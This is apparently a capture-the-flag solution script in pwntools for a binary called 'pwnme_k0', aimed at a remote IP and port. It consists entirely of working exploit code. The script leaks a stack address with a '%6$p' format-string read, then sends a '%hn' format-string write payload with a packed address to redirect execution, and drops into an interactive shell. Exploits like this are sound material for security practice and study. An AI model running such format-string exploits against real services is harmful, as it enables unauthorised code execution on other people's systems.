from pwn import *
context.log_level = 'DEBUG'
#r=process('./pwnme_k0')
#gdb.attach(r,'break *0x400B39')
r = remote("106.15.186.69",30032)
r.recvuntil('Input your username(max lenth:20):')
r.sendline('%6$p')
r.recvuntil('Input your password(max lenth:20):')
r.sendline('%6$p')
r.recvuntil('>')
r.sendline('1')
data=r.recvuntil('>')
data=data.split('\n')[2]
print data
addr=int(data,16)-0x48 
print hex(addr)
r.sendline('2')
r.recvuntil('please input new username(max lenth:20):')
r.sendline('a')
r.recvuntil('please input new password(max lenth:20):')
payload = "%2214u%12$hn"
payload += p64(addr)
r.send(payload)
r.recvuntil('>')
r.sendline('1')
r.interactive()
